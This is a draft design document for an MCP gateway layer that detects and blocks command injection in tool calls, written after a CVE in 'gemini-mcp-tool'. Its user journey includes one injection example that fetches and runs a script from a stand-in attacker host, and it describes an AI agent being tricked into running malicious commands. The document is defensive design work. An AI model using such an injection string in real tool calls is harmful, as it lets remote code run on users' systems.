# Design Doc: RCE Mitigation Layer (CVE-2026-0755)
**Status:** Draft
**Created:** 2026-02-24

## 1. Context and Scope
Recent findings (CVE-2026-0755) revealed a critical Remote Code Execution vulnerability in `gemini-mcp-tool` where unvalidated `execAsync` calls allowed command injection. MCP Any, as a universal gateway, must provide a defensive layer that prevents such vulnerabilities in underlying MCP servers by intercepting and sanitizing dangerous tool calls before they reach the execution environment.

## 2. Goals & Non-Goals
* **Goals:**
    * Intercept all tool calls containing shell-executable patterns.
    * Provide mandatory input sanitization for common injection vectors (`;`, `&&`, `|`, `$(...)`).
    * Implement an "Audit-Only" mode for low-risk environments and a "Block" mode for high-security environments.
    * Standardize how MCP servers report their use of system calls.
* **Non-Goals:**
    * Replacing the MCP server's internal logic.
    * Providing a full sandbox (handled by the Ephemeral Sandbox feature).

## 3. Critical User Journey (CUJ)
* **User Persona:** Security-conscious Developer
* **Primary Goal:** Prevent an AI agent from being tricked into running a malicious command via a vulnerable MCP server.
* **The Happy Path (Tasks):**
    1. Developer enables the "RCE Mitigation Layer" in MCP Any settings.
    2. An LLM attempts to call a tool that passes a malicious string (e.g., `test; curl http://attacker.com/malware | sh`) to a vulnerable `exec` tool.
    3. MCP Any's mitigation layer identifies the injection pattern.
    4. The call is blocked or sanitized (depending on config), and an alert is logged.
    5. The LLM receives an error indicating the call was blocked for security reasons.

## 4. Design & Architecture
* **System Flow:**
    `LLM` -> `MCP Any Gateway` -> `[Mitigation Layer (Regex/AST Analysis)]` -> `Vulnerable MCP Server`
* **APIs / Interfaces:**
    * New configuration schema for `security_policies` in service definitions.
    * Internal `Sanitize(input string)` hook in the tool call pipeline.
* **Data Storage/State:**
    * Violation logs are stored in the existing telemetry database.

## 5. Alternatives Considered
* **Manual Sanitization in MCP Servers**: Rejected because it relies on individual developers and doesn't scale across the ecosystem.
* **Full Sandbox for Every Call**: Rejected as the primary mitigation due to performance overhead; sanitization is a faster first-line defense.

## 6. Cross-Cutting Concerns
* **Security (Zero Trust)**: This layer is a core component of the Zero Trust architecture, ensuring that even if a server is trusted, its inputs are not.
* **Observability**: Every block/sanitization event must be logged with full context for forensic analysis.

## 7. Evolutionary Changelog
* **2026-02-24:** Initial Document Creation in response to CVE-2026-0755.
